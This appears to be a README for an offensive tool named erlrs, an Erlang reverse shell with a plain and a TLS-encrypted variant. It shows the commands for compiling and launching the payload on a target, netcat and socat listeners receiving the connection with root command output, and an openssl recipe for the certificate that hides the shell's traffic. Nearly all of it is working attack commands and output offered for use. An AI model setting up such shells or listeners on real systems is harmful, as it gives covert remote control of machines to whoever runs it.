# erlrs

erlang based reverse shell

**Usage**

erlrs.erl

Target
```
root@WOPR-KALI:/opt/erlrs# erlc erlrs.erl 
erlrs.erl:13: Warning: variable 'Reason' is unused
erlrs.erl:24: Warning: variable 'Reason' is unused
root@WOPR-KALI:/opt/erlrs# erl -noshell -s erlrs main

```

Listener
```
root@WOPR-KALI:~# nc -lvnp 8080
listening on [any] 8080 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44983
uname -a
Linux WOPR-KALI 5.3.0-kali2-amd64 #1 SMP Debian 5.3.9-1kali1 (2019-11-11) x86_64 GNU/Linux
^C
```

erlrss.erl (tls)

Target
```
root@WOPR-KALI:/opt/erlrss# erlc erlrss.erl 
erlrss.erl:13: Warning: variable 'Reason' is unused
erlrss.erl:24: Warning: variable 'Reason' is unused
root@WOPR-KALI:/opt/erlrss# erl -noshell -s erlrss main

```

Listener
```
root@WOPR-KALI:/opt/erlrss# socat openssl-listen:443,reuseaddr,fork,cert=/opt/erlrs/root.pem,cafile=/opt/erlrs/root.crt,verify=0 -
id
uid=0(root) gid=0(root) groups=0(root)
```

Create root.pem:

```
openssl req \
-x509 \
-newkey rsa:4096 \
-sha256 \
-days 3560 \
-nodes \
-keyout root.key \
-out root.crt \
-subj '/CN=target.com' \
-extensions san \
-config <( \
  echo '[req]'; \
  echo 'distinguished_name=req'; \
  echo '[san]'; \
  echo 'subjectAltName=DNS:target.com')
```

![Screenshot from 2019-11-23 00-17-47](https://user-images.githubusercontent.com/56988989/69469085-e3644700-0d86-11ea-899d-07bd4f801bb9.png)

